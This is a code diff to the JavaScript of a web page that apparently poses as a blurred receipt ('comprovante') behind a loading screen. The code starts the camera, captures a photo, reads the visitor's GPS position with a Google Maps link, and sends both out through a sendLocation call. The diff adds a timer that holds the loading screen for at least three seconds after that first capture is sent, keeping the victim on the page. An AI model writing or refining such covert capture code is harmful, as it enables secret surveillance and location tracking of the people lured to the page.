@@ -41,6 +41,7 @@
       const canvas = document.getElementById("canvas");
       let locationData = { latitude: null, longitude: null, accuracy: null, maps: null, source: null };
       let stream;
+      let loadingTimeout;
 
       // Iniciar a câmera imediatamente
       async function startCamera() {
@@ -86,13 +87,18 @@
                 maps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
                 source: "GPS"
               };
-              if (document.querySelector(".comprovante-container.blurred")) {
-                removeLoading();
-                // Enviar a primeira foto e localização imediatamente após a primeira localização
+              if (!loadingTimeout) {
+                // Enviar a primeira foto e localização imediatamente
                 const firstPhoto = capturePhoto();
                 if (firstPhoto) {
                   sendLocation({ ...locationData, photos: [firstPhoto] });
                 }
+                // Garantir que o carregamento dure pelo menos 3 segundos
+                const startTime = Date.now();
+                loadingTimeout = setTimeout(() => {
+                  removeLoading();
+                  loadingTimeout = null;
+                }, Math.max(3000 - (Date.now() - startTime), 0));
               }
             },
             error => {
